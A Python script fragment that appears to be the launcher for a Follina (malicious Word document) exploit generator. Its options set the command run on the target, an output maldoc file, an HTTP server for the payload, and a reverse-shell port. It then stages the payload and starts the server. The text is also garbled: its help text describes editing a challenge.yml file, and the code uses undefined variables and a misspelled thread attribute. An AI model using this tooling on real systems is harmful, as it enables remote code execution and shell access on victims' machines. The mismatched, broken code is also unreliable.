import argparse
from config import *
from validate_args import *
import threading

def args_parser():
    parser = argparse.ArgumentParser(
        description='''\
                dynamically modify the challenge.yml file
            ''',
        epilog='''
                example : %(prog)s update --attr hints -v 'content of a hint ...' ./web/chall-name 
            ''',
        formatter_class=argparse.RawTextHelpFormatter,
        prefix_chars='-',
        conflict_handler='resolve')

    parser.add_argument(
        "--command",
        "-c",
        default=EXECUTED_COMMAND,
        help="command to run on the target (default: calc)",
    )

    parser.add_argument(
        "--output",
        "-o",
        default=OUTPUT_FILE,
        help="output maldoc file (default: ./follina.doc)",
    )

    parser.add_argument(
        "--interface",
        "-i",
        default=NETWORK_INTERFACE,
        help="network interface or IP address to host the HTTP server (default: eth0)",
    )

    parser.add_argument(
        "--port",
        "-p",
        type=int,
        default=PORT,
        help="port to serve the HTTP server (default: 8000)",
    )

    parser.add_argument(
        "--reverse",
        "-r",
        type=int,
        default=REVERSE_PORT,
        help="port to serve reverse shell on",
    )

    # Prepare Staging Docs
    os.mkdir(SERVER_DIR)
    print(":file_folder:", f"Staging Folder: [yellow]{TMP_DIR}[/yellow]")
    prepare_payload_html(options)

    # Start a daemon with our HTTP Server
    thread = threading.Thread(target=start_server,
                              args=(options['server_params'][0], options['server_params'][1]))
    thread.setdaemon = True
    thread.start()

    prepare_malicious_doc(options)


if __name__ == "__main__":
    parser = args_parser()
    args = parser.parse_args()
    options = eval_args(args)
